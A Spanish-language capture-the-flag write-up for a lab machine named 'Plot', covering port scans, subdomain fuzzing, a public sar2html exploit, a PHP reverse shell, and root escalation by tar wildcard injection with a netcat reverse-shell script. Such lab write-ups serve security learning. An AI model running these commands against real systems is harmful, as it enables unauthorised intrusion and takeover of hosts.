# Máquina Plot

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.174

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sV --script vuln -p22,80 --min-rate 6000 -vvv 192.168.42.174

![alt text](image-2.png)

### Fuzzing web

No encontramos nada

### Explotación

hacemos curl para ver las cabeceras.

![alt text](image-3.png)

agregamos al /etc/hosts

![alt text](image-4.png)

aplicamos fuzzing web para ver subdominios

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://pl0t.nyx --append-domain

![alt text](image-5.png)

agremamos el subdominio al /etc/hosts

![alt text](image-6.png)

entramos a http://sar.pl0t.nyx/

![alt text](image-7.png)

buscando un exploit para sar2html 3.2.1

![alt text](image-8.png)

lo descargamos:

![alt text](image-9.png)

lo ejecutamos:

python 49344.py


subimos una reverse shell en php

![alt text](image-10.png)

me puse en escucha con netcat:

![alt text](image-12.png)

![alt text](image-11.png)


### Escalar privilegios

![alt text](image-13.png)

utilizando la herramienta pspy64

![alt text](image-14.png)

en /var/www/html ejecutamos:

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh script.sh"

creamos un archivo script.sh

#!/bin/bash
nc -c /bin/bash 192.168.42.133 443

nos ponemos en escucha con netcat en el puerto 443

![alt text](image-15.png)


### user.txt

![alt text](image-16.png)

### root.txt

![alt text](image-17.png)